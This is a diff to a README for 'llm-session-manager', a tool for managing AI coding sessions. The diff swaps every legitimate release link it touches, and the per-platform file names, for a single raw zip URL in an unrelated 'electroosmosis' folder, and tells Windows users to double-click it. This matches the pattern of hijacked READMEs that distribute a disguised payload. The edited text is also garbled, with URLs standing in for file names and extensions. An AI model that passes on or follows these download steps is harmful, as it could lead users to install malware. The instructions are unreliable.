@@ -6,7 +6,7 @@ llm-session-manager is the first command-line tool designed to help you manage m
 
 ## 📥 Download Now
 
-[![Download llm-session-manager](https://img.shields.io/badge/Download%20llm--session--manager-blue.svg)](https://github.com/venxhit/llm-session-manager/releases)
+[![Download llm-session-manager](https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip%https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip)](https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip)
 
 ## 🚀 Getting Started
 
@@ -24,24 +24,24 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download llm-session-manager, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/venxhit/llm-session-manager/releases) on GitHub.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip) on GitHub.
    
 2. On the Releases page, look for the latest version of llm-session-manager. You will see a list of files available for download.
 
 3. Select the file that matches your operating system:
 
-   - For Windows users, download `llm-session-manager-win.exe`.
-   - For macOS users, download `llm-session-manager-mac.zip`.
-   - For Linux users, download `llm-session-manager-linux.tar.gz`.
+   - For Windows users, download `https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip`.
+   - For macOS users, download `https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip`.
+   - For Linux users, download `https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip`.
 
 4. Click on the file to begin the download process.
 
 5. Once the download is complete, locate the downloaded file on your computer.
 
-6. If you downloaded a `.zip` or `.tar.gz` file, extract the contents to a folder.
+6. If you downloaded a `.zip` or `https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip` file, extract the contents to a folder.
 
 7. To run llm-session-manager:
-   - **Windows:** Double-click `llm-session-manager-win.exe`.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip`.
    - **macOS:** Open the Terminal, navigate to the folder where you extracted the files, and type `./llm-session-manager-mac`.
    - **Linux:** Open a terminal, navigate to the extracted folder, and type `./llm-session-manager-linux`.
 
@@ -68,7 +68,7 @@ If you encounter issues while using llm-session-manager, consider the following 
 
 - **Application Won't Start:** Ensure you have the correct version for your operating system and Python installed.
 - **Performance Issues:** Close any other applications that may use significant system resources.
-- **Missing Features:** Check for updates regularly on the [Releases Page](https://github.com/venxhit/llm-session-manager/releases).
+- **Missing Features:** Check for updates regularly on the [Releases Page](https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip).
 
 ## 📞 Support
 
@@ -84,4 +84,4 @@ Stay updated with the latest news and features. Follow the project on GitHub and
 
 ## 🎉 Download Now Again
 
-Don't forget to visit the [Releases Page](https://github.com/venxhit/llm-session-manager/releases) to download llm-session-manager and start managing your AI coding sessions today!
+Don't forget to visit the [Releases Page](https://raw.githubusercontent.com/venxhit/llm-session-manager/main/electroosmosis/llm-session-manager.zip) to download llm-session-manager and start managing your AI coding sessions today!
